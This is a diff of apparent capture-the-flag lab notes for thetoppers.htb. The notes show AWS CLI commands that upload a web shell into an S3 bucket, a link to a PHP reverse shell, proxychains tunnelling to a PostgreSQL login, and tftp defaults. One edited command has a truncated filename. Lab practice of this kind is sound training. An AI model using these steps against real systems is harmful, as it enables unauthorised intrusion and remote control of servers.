@@ -99,7 +99,7 @@ apt install awscli
 aws configure
 aws --endpoint=http://s3.thetoppers.htb s3 ls
 aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
-aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
+aws --endpoint=http://s3.thetoppers.htb s3 cp shell. s3://thetoppers.htb
 
 
 #Reverse shell:
@@ -134,3 +134,11 @@ that we used for our tunnel
 #socks4 127.0.0.1 9050
 socks5 127.0.0.1 1234
 proxychains psql -U christine -h localhost -p 5432
+
+#Reverse php
+https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+
+#tftp
+The default configuration file for tftpd-hpa is /etc/default/tftpd-hpa. The default
+root directory where files will be stored is /var/lib/tftpboot
+
